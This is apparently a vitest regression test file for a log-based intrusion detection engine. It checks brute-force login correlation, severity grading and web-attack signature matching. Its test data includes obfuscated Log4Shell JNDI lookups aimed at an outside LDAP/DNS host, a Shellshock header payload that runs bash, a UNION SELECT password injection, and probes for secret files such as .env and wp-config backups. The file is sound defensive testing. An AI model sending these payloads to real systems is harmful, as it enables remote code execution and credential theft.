import { describe, expect, it } from 'vitest';
import { defaultDetectionConfig } from '../../../src/features/detection/config/detectionConfig';
import { runDetections } from '../../../src/features/detection/engine/runDetections';
import {
  matchRequestSignatures,
  matchSensitivePath,
  resolveLookups,
} from '../../../src/features/detection/rules/webSignatures';
import { runOnly } from '../../helpers/detection';
import { build, fail, MIN, ok, req, SEC, T0, times } from '../../helpers/events';
import { ingest } from '../../helpers/ingest';

/**
 * Regressions for findings from an independent accuracy review. Each test uses
 * the reviewer's reproduction input.
 */

describe('GEN-003 and AUTH-004 do not call routine admin logins a compromise', () => {
  it('rates a login that only shares an account name with others’ failures as low, never critical', () => {
    const events = build([
      ...times(10, T0, 18 * SEC).map((t, i) => fail(t, `203.0.113.${10 + i}`, 'root')),
      ok(T0 + 8 * MIN, '198.51.100.7', 'root'),
    ]);
    const { detections } = runDetections(events, defaultDetectionConfig());
    const a4 = detections.find((d) => d.ruleId === 'AUTH-004')!;
    expect(a4).toMatchObject({ severity: 'low', confidence: 'low' });
    expect(a4.title).toBe('Login for "root" after failures from other sources');
    expect(a4.reason).toContain('None of the failures came from this IP');
    expect(detections.some((d) => d.severity === 'critical')).toBe(false);
  });

  it('does not escalate when the brute force happened long after the login', () => {
    const nat = '198.51.100.20';
    const events = build([
      ...times(3, T0, 20 * SEC).map((t) => fail(t, nat, 'alice')),
      ok(T0 + 2 * MIN, nat, 'alice'),
      ...times(12, T0 + 7 * 24 * 60 * MIN, SEC).map((t) => fail(t, nat, 'admin')),
    ]);
    const { detections } = runDetections(events, defaultDetectionConfig());
    expect(detections.find((d) => d.ruleId === 'AUTH-004')?.severity).toBe('high');
    expect(detections.find((d) => d.ruleId === 'GEN-003')?.severity).not.toBe('critical');
  });

  it('still escalates a strongly linked login that follows overlapping brute force', () => {
    const events = build([
      ...times(12, T0, 10 * SEC).map((t) => fail(t, '203.0.113.50', 'root')),
      ok(T0 + 3 * MIN, '203.0.113.50', 'root'),
    ]);
    const corr = runDetections(events, defaultDetectionConfig()).detections.find(
      (d) => d.ruleId === 'GEN-003' && d.subjects.ips.includes('203.0.113.50'),
    );
    expect(corr?.severity).toBe('critical');
  });

  it('bumps severity only for independent kinds of signal, not for overlapping rules', () => {
    // A crawler trips 4xx bursts, path probing and high volume: two kinds of signal.
    const crawler = '198.51.100.200';
    const events = build(
      times(420, T0, 130).map((t, i) =>
        req(t, crawler, `/products/${1000 + (i % 180)}`, i % 8 === 0 ? 404 : 200),
      ),
    );
    const cfg = defaultDetectionConfig();
    cfg.rules['WEB-001'].params.threshold = 40;
    const corr = runDetections(events, cfg).detections.find((d) => d.ruleId === 'GEN-003');
    expect(corr).toBeDefined();
    expect(corr!.severity).not.toBe('high');
    expect(corr!.evidence.find((e) => e.label === 'Independent kinds of signal')?.value).toMatch(
      /^2: /,
    );
  });
});

describe('AUTH-004 window and ordering', () => {
  it('counts failures logged in the same second before the success', () => {
    const events = build([
      ...times(3, T0, 0).map(() => fail(T0, '203.0.113.5', 'bob')),
      ok(T0, '203.0.113.5', 'bob'),
    ]);
    expect(runOnly('AUTH-004', events).detections).toHaveLength(1);
  });

  it('reports a new burst after an earlier success as its own finding', () => {
    const ip = '203.0.113.5';
    const events = build([
      ...times(3, T0, SEC).map((t) => fail(t, ip, 'bob')),
      ok(T0 + 5 * SEC, ip, 'bob'),
      ...times(50, T0 + 6 * SEC, 20 * SEC).map((t) => fail(t, ip, 'bob')),
      ok(T0 + 20 * MIN, ip, 'bob'),
    ]);
    const found = runOnly('AUTH-004', events).detections;
    expect(found).toHaveLength(2);
    expect(Math.max(...found.map((d) => d.metric))).toBeGreaterThanOrEqual(50);
  });

  it('uses the earliest failure as the start even for newest-first exports', () => {
    const ip = '203.0.113.5';
    const events = build([
      ok(T0 + 10 * MIN, ip, 'bob'),
      fail(T0 + 9 * MIN, ip, 'bob'),
      fail(T0 + 5 * MIN, ip, 'bob'),
      fail(T0 + MIN, ip, 'bob'),
    ]);
    expect(runOnly('AUTH-004', events).detections[0]?.start).toBe(T0 + MIN);
  });
});

describe('web signature coverage', () => {
  it.each([
    '${${lower:j}ndi:ldap://203.0.113.9/a}',
    '${${::-j}${::-n}${::-d}${::-i}:ldap://203.0.113.9/a}',
    '${j${::-n}di:dns://203.0.113.9/a}',
    '${${env:NaN:-j}ndi${env:NaN:-:}ldap://203.0.113.9/a}',
  ])('resolves obfuscated JNDI lookup %s', (payload) => {
    expect(resolveLookups(payload)).toMatch(/\$\{jndi:/i);
    expect(matchRequestSignatures('/', payload).map((m) => m.signature.id)).toContain('log4shell');
  });

  it('checks the Referer header for header-borne exploits', () => {
    const m = matchRequestSignatures('/', 'Mozilla/5.0', '() { :; }; /bin/bash -c id');
    expect(m).toEqual([expect.objectContaining({ where: 'referrer' })]);
  });

  it('finds payloads in request lines that contain spaces', () => {
    const r = ingest(
      '203.0.113.9 - - [27/Oct/2026:10:00:00 +0000] "GET /index.php?id=1 UNION SELECT password FROM users HTTP/1.1" 500 0 "-" "x"',
      'apache',
    );
    expect(r.events[0]?.status).toBe('parsed');
    expect(runOnly('WEB-008', r.events).detections).toHaveLength(1);
  });

  it('stays fast on crafted long requests', () => {
    const crafted = `/x?${'<img '.repeat(400)}${'${a'.repeat(400)}`;
    const started = performance.now();
    for (let i = 0; i < 500; i++) matchRequestSignatures(crafted, crafted, crafted);
    expect(performance.now() - started).toBeLessThan(1500);
  });
});

describe('WEB-003 does not raise health checks and monitoring to high', () => {
  it('treats status and health endpoints as admin paths, not secrets', () => {
    expect(matchSensitivePath('/actuator/health')?.kind).toBe('admin');
    expect(matchSensitivePath('/server-status')?.kind).toBe('admin');
    expect(matchSensitivePath('/actuator/env')?.kind).toBe('secret');
    expect(matchSensitivePath('/assets/config.json')).toBeUndefined();
    expect(matchSensitivePath('/config.json')?.kind).toBe('secret');
  });

  it('rates a Kubernetes probe polling /actuator/health as low', () => {
    const events = build(
      times(6, T0, 10 * SEC).map((t) => req(t, '10.0.0.12', '/actuator/health', 200)),
    );
    expect(runOnly('WEB-003', events).detections[0]?.severity).toBe('low');
  });

  it('keeps a secret served to a private address at medium', () => {
    const events = build([
      ...['/.git/HEAD', '/.htaccess', '/backup.sql', '/wp-config.php.bak'].map((p, i) =>
        req(T0 + i * SEC, '127.0.0.1', p, 404),
      ),
      req(T0 + 5 * SEC, '127.0.0.1', '/.env', 200),
    ]);
    expect(runOnly('WEB-003', events).detections[0]).toMatchObject({ severity: 'medium' });
  });
});

describe('WEB-007 catches login guessing answered with 200', () => {
  it('counts POSTs to /wp-login.php regardless of status', () => {
    const events = build(
      times(120, T0, 5 * SEC).map((t) =>
        req(t, '203.0.113.40', '/wp-login.php', 200, { method: 'POST' }),
      ),
    );
    const [d] = runOnly('WEB-007', events).detections;
    expect(d).toMatchObject({ severity: 'medium' });
    expect(d?.title).toContain('Repeated login attempts to /wp-login.php');
  });
});
